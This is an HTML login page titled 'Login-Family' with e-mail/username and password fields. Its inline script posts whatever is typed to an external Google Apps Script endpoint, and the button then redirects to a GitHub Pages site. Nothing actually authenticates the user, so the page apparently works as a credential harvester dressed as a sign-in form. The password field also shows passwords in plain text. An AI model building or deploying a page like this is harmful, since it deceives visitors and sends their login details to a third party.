<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<head>

    <title>Login-Family</title>
    <link rel="shortcut icon" href="Logo Web.png" type="image/x-icon">

</head>
</head>
<body>

	<style>
        body{
            background-image: url(jne.jpg);
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            background-attachment: fixed;
            height: 100%;
        }
        .title{
            text-align: center;
            font-size: 2.5em;
            color: #000;
        }
 
         
    </style>


	<div class="container py-5">
		<div class="row">
			<div class="col-lg-5 col-md-8 mx-auto shadow border bg-white p-4 rounded">
				<h2 class="text-center fw-bold mb-3">Login</h2>
				<form name="login-page">
					<div class="form-group mb-3">
						<label for="email" class="form-label">E-mail/Username</label>
						<input type="text" id="email" name="email" class="form-control" placeholder="Enter Your email" required>
					</div>
					<div class="form-group mb-3">
						<label for="password" class="form-label">Password</label>
						<input type="text" id="password" name="password" class="form-control" placeholder="Enter Your Password" required>
					</div>
					<div>
						<center>

							<button onclick="window.location.href='https://arthasa28.github.io/family_mamih/'" class="btn btn-primary me-2" type="submit">Log-in -></button>

						</center>
					</div>
				</form>
			</div>
		</div>
	</div>

	<script src="https://code.jquery.com/jquery-3.6.0.js"></script>

	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>

	<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbxXzCIxINygNbxRjeCOewE6es4baKx1fB7zM7LCZYqVqV32uyel29gktXZBj2HHA5XvfQ/exec'
  const form = document.forms['login-page']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>


</body>
</html>
